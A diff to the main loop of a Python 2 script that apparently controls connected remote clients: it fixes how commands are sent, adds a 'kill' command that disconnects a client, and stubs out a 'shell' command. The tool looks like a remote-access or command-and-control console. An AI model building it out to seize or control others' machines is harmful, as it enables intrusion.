@@ -75,12 +75,29 @@ def main():
         if cmd in passive_commands:
             runMe = passive_commands[cmd]
             runMe(action)
-        
+
         elif cmd in commands.active:
-            server.currentClient.send(prompt)
+            server.currentClient.conn.send(prompt)
             print server.currentClient.conn.recv(4096)
-            # here find a way to recv as much as needed
-        
+
+        # Special Cases
+        elif cmd == "kill":
+            if action:
+                name = action
+            else:
+                name = server.currentClient.uid
+                server.currentClient = None
+
+            try:
+                server.clients[name].conn.send(prompt)
+                server.clients[name].conn.close()
+                server.remove_client(name)
+            except KeyError:
+                print "that client doesnt exist. [No action taken]"
+
+        elif cmd == "shell":
+            pass
+
         else:
             print "That command isnt correct or unsupported."
 
